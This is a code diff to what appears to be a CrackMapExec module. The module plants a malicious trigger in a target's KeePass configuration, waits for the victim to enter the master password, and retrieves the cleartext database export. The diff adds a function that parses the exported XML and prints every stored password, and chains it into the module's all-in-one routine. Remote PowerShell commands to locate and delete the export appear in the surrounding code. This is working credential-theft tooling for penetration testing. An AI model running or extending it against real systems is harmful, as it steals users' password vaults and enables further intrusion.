@@ -1,4 +1,6 @@
 import sys
+import json
+from xmltodict import parse
 from time import sleep
 from csv import reader
 from base64 import b64encode
@@ -223,7 +225,8 @@ class CMEModule:
     def poll(self, context, connection):
         """Search for the cleartext database export file in the specified export folder (until found, or manually exited by the user)"""
         found = False
-        context.log.info('Polling for database export every {} seconds, please be patient, we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything'.format(self.poll_frequency_seconds))
+        context.log.info('Polling for database export every {} seconds, please be patient'.format(self.poll_frequency_seconds))
+        context.log.info('we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything')
         # if the specified path is %APPDATA%, we need to check in every user's folder
         if self.export_path == '%APPDATA%' or self.export_path == '%appdata%':
             poll_export_command_str = 'powershell.exe "Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\Users\\\'+$_.Name+\'\\AppData\\Roaming\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}"'.format(self.export_name)
@@ -280,7 +283,7 @@ class CMEModule:
                 remove_export_command_str = 'powershell.exe Remove-Item {}'.format(export_path)
                 connection.execute(remove_export_command_str, True)
         else:
-            context.log.info('No export found in {}'.format(self.export_path))
+            context.log.info('No export found in {} , everything is cleaned'.format(self.export_path))
 
         # if the malicious trigger was not self-deleted, deletes it
         if self.trigger_added(context, connection):
@@ -311,15 +314,19 @@ class CMEModule:
             context.log.success('No trigger "{}" found in "{}", skipping'.format(self.trigger_name, self.keepass_config_path))
 
     def all_in_one(self, context, connection):
+
         """Performs ADD, RESTART, POLL and CLEAN actions one after the other"""
-        print('')
+        context.log.highlight("")
         self.add_trigger(context, connection)
-        print('')
+        context.log.highlight("")
         self.restart(context, connection)
         self.poll(context, connection)
-        print('')
+        context.log.highlight("")
         context.log.info('Cleaning everything..')
         self.clean(context, connection)
+        context.log.highlight("")
+        context.log.info('Extracting password..')
+        self.extract_password(context)
 
     def trigger_added(self, context, connection):
         """check if the trigger is added to the config file XML tree (returns True/False)"""
@@ -356,3 +363,35 @@ class CMEModule:
         connection.execute(script_execute_cmd, True)
         remove_remote_temp_script_cmd = 'powershell.exe "Remove-Item \"{}\""'.format(self.remote_temp_script_path)
         connection.execute(remove_remote_temp_script_cmd)
+
+    def extract_password(self, context):
+        xml_doc_path = os.path.abspath(self.local_export_path + "/" + self.export_name)
+        xml_tree = ElementTree.parse(xml_doc_path)
+        root = xml_tree.getroot()
+        to_string  = ElementTree.tostring(root, encoding='UTF-8', method='xml')
+        xml_to_dict = parse(to_string)
+        dump = json.dumps(xml_to_dict)
+        obj = json.loads(dump)
+
+        if len(obj['KeePassFile']['Root']['Group']['Entry']):
+            for obj2 in obj['KeePassFile']['Root']['Group']['Entry']:
+                for password in obj2['String']:
+                    if password['Key'] == "Password":
+                        context.log.highlight(str(password['Key']) + " : " + str(password['Value']['#text']))
+                    else:
+                        context.log.highlight(str(password['Key']) + " : " + str(password['Value']))
+                context.log.highlight("")
+        if len(obj['KeePassFile']['Root']['Group']['Group']):
+            for obj2 in obj['KeePassFile']['Root']['Group']['Group']:
+                try:
+                    for obj3 in obj2['Entry']:
+                        for password in obj3['String']:
+                            if password['Key'] == "Password":
+                                context.log.highlight(str(password['Key']) + " : " + str(password['Value']['#text']))
+                            else:
+                                context.log.highlight(str(password['Key']) + " : " + str(password['Value']))
+                        context.log.highlight("")
+                except KeyError:
+                    pass
+
+
